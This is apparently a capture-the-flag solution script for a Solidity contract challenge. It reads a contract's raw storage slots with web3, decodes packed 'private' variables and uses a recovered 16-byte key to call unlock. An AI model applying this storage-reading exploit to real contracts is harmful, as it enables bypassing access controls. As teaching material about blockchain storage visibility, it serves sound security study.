/*
bool public locked = true;
uint256 public ID = block.timestamp;
uint8 private flattening = 10;
uint8 private denomination = 255;
uint16 private awkwardness = uint16(now);
bytes32[3] private data;
*/

// slot 0 - locked
const slot0 = await web3.eth.getStorageAt(instance, 0);
console.log("locked: ", web3.utils.hexToNumber(slot0)); // 1 - true

// slot 1 - ID
const slot1 = await web3.eth.getStorageAt(instance, 1);
console.log("ID: ", web3.utils.hexToNumber(slot1));

// slot 2 - flattening, denomination, awkwardness
const slot2 = await web3.eth.getStorageAt(instance, 2);
// We have 3 state variables compressed into one hex by the compiler
// Let's break that hex value into bytes. We know that bytes are written from right to left
const slot2BytesArr = web3.utils.hexToBytes(slot2);
console.log("flattening: ", slot2BytesArr[31]) // First declared state variable sits at the last position of the 32 bytes array
console.log("denomination: ", slot2BytesArr[30]) // Second declaration sits at the one before last position

// we know that `now` is an alias of `block.timestamp`
console.log("awkwardness is ID reduced to uint16");
console.log("ID is an Hex of 4 bytes (4*8 == uint32): ", slot1);
console.log("From uint32 to uint16 => remove half of the high order bits of the uint32.");
console.log("awkwardness :", web3.utils.bytesToHex(slot2BytesArr.slice(-4, -2)));

// slot 3 - data[0]
const slot3 = await web3.eth.getStorageAt(instance, 3);
console.log("data[0]: ", web3.utils.hexToAscii(slot3));

// slot 4 - data[1]
const slot4 = await web3.eth.getStorageAt(instance, 4);
console.log("data[1]: ", web3.utils.hexToAscii(slot4));

// slot 5 - data[2]
const slot5 = await web3.eth.getStorageAt(instance, 5);
console.log("data[2]: ", web3.utils.hexToAscii(slot5));

const slot5BytesArray = web3.utils.hexToBytes(slot5);
const slot5To16BytesArray = slot5BytesArray.slice(-32, -16);

const key = web3.utils.bytesToHex(slot5To16BytesArray);

console.log("_key: ", key);

console.log("### Unlocking contract ###");
await contract.unlock(key);

